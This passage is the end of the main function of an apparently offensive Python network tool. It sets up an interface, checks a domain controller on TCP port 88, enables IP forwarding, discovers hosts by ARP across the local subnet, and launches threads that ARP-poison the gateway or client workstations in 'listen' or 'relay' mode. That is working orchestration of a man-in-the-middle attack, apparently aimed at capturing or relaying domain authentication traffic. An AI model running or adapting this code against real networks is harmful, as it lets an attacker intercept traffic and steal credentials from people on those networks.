        rich_print_success('Network interface configuration completed successfully')
        
    except Exception as e:
        if debug:
            rich_print_error(f'Interface configuration failed: {e}')
        rich_print_warning(f'Could not get interface details for {iface}: {e}')
        rich_print_info('Available interfaces will be shown for selection...')
        iface = select_interface()
        if not iface:
            logging.error('[!] No interface selected. Quitting...')
            sys.exit(1)
        
        # Try again with selected interface
        try:
            # Removed stop flag check during retry - let initialization complete
                
            iface_ip = get_if_addr(iface)
            if not iface_ip or iface_ip == '0.0.0.0':
                raise ValueError(f"Selected interface {iface} has no valid IP address")
            
            # Try to get additional details
            netmask = '255.255.255.0'  # Default fallback
            hwsrc = None
            
            try:
                # Try to find corresponding netifaces interface by IP matching
                for neti_name in netifaces.interfaces():
                    # Removed stop flag check in retry loop - let initialization complete
                        
                    try:
                        neti_addrs = netifaces.ifaddresses(neti_name)
                        if netifaces.AF_INET in neti_addrs:
                            neti_ip = neti_addrs[netifaces.AF_INET][0].get('addr', '')
                            if neti_ip == iface_ip:
                                netmask = neti_addrs[netifaces.AF_INET][0].get('netmask', '255.255.255.0')
                                # Get MAC address
                                if netifaces.AF_LINK in neti_addrs:
                                    hwsrc = neti_addrs[netifaces.AF_LINK][0].get('addr')
                                break
                    except:
                        continue
            except:
                pass
            
            if not hwsrc:
                hwsrc = "00:00:00:00:00:00"  # Will be detected/updated later
                
            iface_subnet = ipaddress.IPv4Network(f'{iface_ip}/{netmask}', strict=False)
            
        except Exception as e2:
            logging.error(f'[!] Could not configure selected interface {iface}: {e2}')
            sys.exit(1)

    if parameters.gw is not None and ipaddress.ip_address(parameters.gw) not in ipaddress.ip_network(iface_subnet) :
        logging.error(f'[!] Gateway not in {iface} subnet. Quitting...')
        sys.exit(1)

    if parameters.dc is not None and not is_dc_up(dc):
        logging.error('[!] DC did not respond to TCP/88 ping probe. Quitting...')
        sys.exit(1)

    if parameters.dc is not None and ipaddress.ip_address(dc) in ipaddress.ip_network(iface_subnet) :
        if parameters.gw is None :
            if mode == 'relay' :
                logging.info('[*] DC seems to be in the same VLAN, will spoof as DC\'s IP')
            else :
                logging.info('[*] DC seems to be in the same VLAN, will poison the DC\'s ARP cache')
            gw = dc
        elif parameters.gw != dc :
            logging.warning('[!] DC seems to be in the same VLAN, will ignore -gw parameter')
            gw = dc

    if not disable_spoofing :
        if parameters.iface is None :
            logging.info(f'[*] No interface specified, will use the default interface : {iface}')
        else :
            logging.info(f'[*] Interface : {iface}')
        if parameters.gw is None and dc != gw:
            logging.info(f'[*] No gateway specified, will use the default gateway : {gw}')
        elif parameters.gw is not None and dc != gw :
            logging.info(f'[*] Gateway IP : {gw}')

    # Username tracking functionality has been removed

    # Handle output file naming
    if os.path.isfile(outfile) :
        i = 1
        while os.path.isfile(f'{outfile}.{i}') :
            # Removed stop flag check during file naming - let initialization complete
            i += 1
        outfile += f'.{i}'

    # Removed stop flag check before firewall operations - these were causing early exits

    # Backup firewall rules
    firewall_backup_file = backup_firewall_rules()
    if not firewall_backup_file:
        logging.error('[!] Could not create any firewall backup. Quitting.')
        sys.exit(1)
    logging.debug('[*] Firewall backup completed')

    # Removed stop flag check before IP forwarding - let initialization complete

    # Get current IP forwarding status and enable it if needed
    original_ip_forward = get_ip_forwarding_status()
    if not original_ip_forward:
        if not enable_ip_forwarding():
            logging.error('[!] Could not enable IP forwarding. Quitting.')
            # Restore firewall backup before exiting
            restore_firewall_rules(firewall_backup_file)
            sys.exit(1)
        logging.debug('[*] Enabled IP forwarding')

    # Removed stop flag check after IP forwarding - let initialization complete

    if parameters.mode == 'listen':
        configure_firewall_forwarding()

    # Target configuration
    if not disable_spoofing :
        if parameters.t is not None :
            if is_valid_ip_list(parameters.t.replace(' ','')) :
                TargetsList = parameters.t.replace(' ','').split(',')
            elif is_valid_ipwithmask(parameters.t) :
                subnet = ipaddress.ip_network(parameters.t, strict=False)
                TargetsList = [str(ip) for ip in subnet.hosts()]
            else :
                logging.error('[!] IP list in a bad format, expected format : 192.168.1.2,192.168.1.3,192.168.1.5 OR 192.168.1.0/24')
                sys.exit(1)
        elif parameters.tf is not None :
            print('[DEBUG] Processing target list from file...')
            try :
                with open(parameters.tf, 'r') as f:
                    iplist = f.read().strip().replace('\n',',')
            except Exception as e :
                logging.error(f'[-] Could not open file : {e}')
                sys.exit(1)
            if not is_valid_ip_list(iplist) :
                logging.error('[!] IP list in a bad format')
                sys.exit(1)
            TargetsList = iplist.split(',')
        else :
            TargetsList = [str(ip) for ip in iface_subnet.hosts()]
            TargetsList.remove(gw)
            logging.info(f'[*] Targets not supplied, will use local subnet {iface_subnet} minus the gateway')

        if gw in TargetsList and (parameters.t is not None or parameters.tf is not None) :
            logging.info('[*] Found gateway in targets list. Removing it')
            TargetsList.remove(gw)

        my_ip = get_if_addr(iface)
        if my_ip in TargetsList :
            TargetsList.remove(my_ip)
        
        ip_addresses_not_in_iface_subnet = []
        if parameters.t is not None or parameters.tf is not None :
            logging.debug('[*] Checking targets list...')
            ip_addresses_not_in_iface_subnet = [ip for ip in set(TargetsList) if ipaddress.ip_address(ip) not in ipaddress.ip_network(iface_subnet)]
        if len(ip_addresses_not_in_iface_subnet) > 0 :
            logging.debug(f'[-] These IP addresses are not in {iface} subnet and will be removed from targets list : {ip_addresses_not_in_iface_subnet}')
            logging.warning('[!] Some IP addresses were removed from the targets list. Run in debug mode for more details.')
        if set(TargetsList) == set(ip_addresses_not_in_iface_subnet) : 
            logging.error(f'[-] No target IP was in {iface} subnet. Quitting...')
            sys.exit(1)

        logging.debug('[*] ARP ping : discovering targets')
        print('[DEBUG] Starting ARP discovery for targets...')
        print(f'[DEBUG] Target list has {len(TargetsList)} IPs, plus gateway: {gw}')
        
        # Removed stop flag check before ARP discovery - let initialization complete
            
        mac_addresses = get_mac_addresses(TargetsList + [gw])
        print(f'[DEBUG] ARP discovery completed, found {len(mac_addresses)} responding hosts')

        # Removed stop flag check after ARP discovery - let initialization complete

        if gw not in mac_addresses :
            if gw == dc :
                logging.error('[-] DC did not respond to ARP. Quitting...')
            else :
                logging.error('[-] Gateway did not respond to ARP. Quitting...')
            # Cleanup before exit
            cleanup_all()
            sys.exit(1)

        Targets = set(TargetsList) - set(ip_addresses_not_in_iface_subnet)
        InitialTargets = set(TargetsList) - set(ip_addresses_not_in_iface_subnet)

        print(f'[DEBUG] Final target configuration - Targets: {list(Targets)}, InitialTargets: {list(InitialTargets)}')

        if parameters.mode == 'listen':
            print('[DEBUG] Starting listen mode ARP spoofing thread...')
            thread = threading.Thread(target=listenmode_arp_spoof)
            thread.daemon = True  # Allow main program to exit even if thread is running
            thread.start()
            print('[DEBUG] ARP spoofing thread started successfully')
            if dc != gw : logging.info('[+] ARP poisoning the gateway\n')
        elif parameters.mode == 'relay' :
            print('[DEBUG] Starting relay mode ARP spoofing...')
            Targets.intersection_update(set(mac_addresses.keys()))
            if Targets == set() :
                logging.error('[-] No target responded to ARP. Quitting...')
                # Cleanup before exit
                cleanup_all()
                sys.exit(1)
            thread = threading.Thread(target=relaymode_arp_spoof, args=(gw,))
            thread.daemon = True  # Allow main program to exit even if thread is running
            thread.start()
            print('[DEBUG] Relay mode ARP spoofing thread started')
            logging.info('[+] ARP poisoning the client workstations')
        logging.debug(f'[*] Net probe check, targets list : {list(Targets)}')
    else :
        logging.warning(f'[!] ARP spoofing disabled')

    # Removed stop flag check before mode execution - let the actual mode handle interrupts
    # The flag should only be checked AFTER initialization is complete, within the actual mode

    # Setup is complete, mark it and start live display
    setup_complete = True
    rich_print_success('Configuration completed successfully!')
    rich_print_info(f'Starting {mode} mode with Rich live display...', 'green')
    
    # Windows packet capture troubleshooting info
    if mode == 'listen':
        rich_print_info('Windows Packet Capture Requirements:', 'yellow')
        rich_print_info('1. WinPcap or Npcap must be installed', 'white')
        rich_print_info('2. Must run as Administrator', 'white')
        rich_print_info('3. Windows Defender/Firewall may block packet capture', 'white')
        rich_print_info('4. Some corporate networks block raw packet capture', 'white')
        if not is_admin():
            rich_print_warning('Not running as Administrator - packet capture may fail!')
    
    # Execute the appropriate mode
    try:
        if mode == 'relay' :
            rich_print_info('Starting relay mode execution...')
            
            # Setup enhanced Windows networking for relay mode
            setup_windows_networking()
            
            relay_mode()
        else :
            rich_print_info('Starting listen mode execution...')
            listen_mode()
    except Exception as e:
        rich_print_error(f'Unexpected error during execution: {e}')
        rich_print_warning('Performing emergency cleanup...')
        cleanup_all()
        sys.exit(1)
    finally:
        pass

if __name__ == '__main__':
    main()
